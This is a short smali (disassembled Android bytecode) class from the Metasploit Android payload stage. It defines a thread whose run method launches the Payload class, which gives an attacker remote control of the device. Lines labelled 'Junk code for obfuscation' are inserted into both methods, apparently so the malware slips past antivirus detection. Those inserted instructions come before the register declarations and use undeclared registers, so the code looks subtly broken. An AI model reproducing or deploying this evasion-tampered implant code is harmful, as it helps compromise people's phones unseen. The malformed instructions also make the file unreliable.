.class final Lcom/metasploit/stage/e;
.super Ljava/lang/Thread;


# direct methods
.method constructor <init>()V

    # Junk code for obfuscation
    const/4 v10, 0x0
    const/4 v11, 0x1
    add-int v12, v10, v11
    .locals 0

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V

    # Junk code for obfuscation
    const/4 v10, 0x0
    const/4 v11, 0x1
    add-int v12, v10, v11
    .locals 1

    const/4 v0, 0x0

    invoke-static {v0}, Lcom/metasploit/stage/Payload;->main([Ljava/lang/String;)V

    return-void
.end method
